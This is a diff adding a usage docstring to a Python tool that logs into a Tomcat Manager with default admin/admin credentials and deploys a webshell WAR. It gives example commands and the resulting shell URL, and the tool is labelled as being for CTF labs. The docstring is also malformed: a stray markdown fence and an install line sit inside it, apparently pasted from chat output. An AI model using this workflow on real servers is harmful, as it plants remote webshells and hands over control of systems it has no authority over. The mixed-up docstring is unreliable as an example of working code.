@@ -2,6 +2,23 @@
 """
 Tomcat Manager WAR Deployer for CTF Labs
 Usage: python3 tomcat_deploy.py -u <url> -w webshell.war
+pip install requests
+
+# Default credentials, default WAR name
+python3 tomcat_deploy.py -u http://10.10.10.5:8080
+
+# Custom credentials or app name
+python3 tomcat_deploy.py -u http://10.10.10.5:8080 -U admin -P admin -w webshell.war -n shell
+```
+
+**What it does:**
+1. Hits `/manager/text/serverinfo` first to verify creds before uploading
+2. Uses a `PUT` to `/manager/text/deploy` with the WAR as binary payload
+3. Sets `update=true` so re-deployment works if the app is already deployed
+4. Prints the final webshell URL on success
+
+**After deployment**, our webshell will be accessible at:
+http://<host>:8080/webshell/
 """
 
 import requests
